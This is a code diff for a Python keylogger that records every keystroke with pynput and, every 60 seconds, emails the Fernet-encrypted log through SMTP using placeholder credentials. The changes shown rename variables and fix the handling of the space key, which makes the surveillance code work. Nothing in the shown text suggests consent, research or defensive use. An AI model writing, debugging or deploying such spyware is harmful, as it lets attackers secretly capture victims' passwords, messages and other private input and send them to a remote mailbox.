@@ -1,25 +1,26 @@
-import pynput.keyboard
+import pynput
+import pynput.keyboard as keyboard
 import threading
 import smtplib
 from cryptography.fernet import Fernet
 
 # Generate a key and instantiate a Fernet instance
-key = Fernet.generate_key()
-cipher_suite = Fernet(key)
+cipher_key = Fernet.generate_key()
+cipher_suite = Fernet(cipher_key)
 
 log = ""
 
 
 # Callback for each key press
-def process_key_press(key):
+def process_key_press(pressed_key):
     global log
     try:
-        log = log + str(key.char)
+        log = log + str(pressed_key.char)
     except AttributeError:
-        if key == key.space:
+        if pressed_key == keyboard.Key.space:
             log = log + " "
         else:
-            log = log + " " + str(key) + " "
+            log = log + " " + str(pressed_key) + " "
 
 
 # Send mail function with encryption
@@ -39,7 +40,7 @@ def report():
     global log
     if log:
         print(log)
-        send_mail("Your_email", "APP_Password", log, key)  # Pass the key to send_mail
+        send_mail("Your_email", "APP_Password", log, cipher_key)  # Pass the key to send_mail
     log = ""
     timer = threading.Timer(60, report)
     timer.start()
